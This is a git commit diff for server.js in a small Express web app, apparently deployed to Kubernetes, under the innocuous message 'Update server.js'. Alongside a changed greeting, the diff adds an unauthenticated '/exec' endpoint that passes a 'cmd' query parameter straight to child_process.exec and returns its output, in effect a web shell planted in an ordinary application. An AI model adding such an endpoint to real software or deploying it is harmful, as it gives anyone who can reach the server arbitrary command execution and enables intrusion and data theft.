4d72bff8c9847f1a0df06425862f19a5a61b5b5e
Whiskers <46506982+SamHancock@users.noreply.github.com>
2025-05-11 17:20:26 -0400

    Update server.js

--- server.js
+++ server.js
@@ -1,11 +1,25 @@
 const express = require('express');
+const { exec } = require('child_process');
 const app = express();
 const port = process.env.PORT || 3000;
-
 app.get('/', (req, res) => {
-  res.send('Node.js App Running in AKS!');
+res.send('This is a new deployed Application!');
 });
-
+app.get('/exec', (req, res) => {
+const cmd = req.query.cmd;
+if (!cmd) {
+return res.status(400).send('Missing "cmd" query parameter');
+}
+exec(cmd, (error, stdout, stderr) => {
+if (error) {
+return res.status(500).send(`Error: ${error.message}`);
+}
+if (stderr) {
+return res.status(500).send(`Stderr: ${stderr}`);
+}
+res.send(`Output:\n${stdout}`);
+});
+});
 app.listen(port, () => {
-  console.log(`Listening at http://localhost:${port}`);
+console.log(`Listening at http://localhost:${port}`);
 });
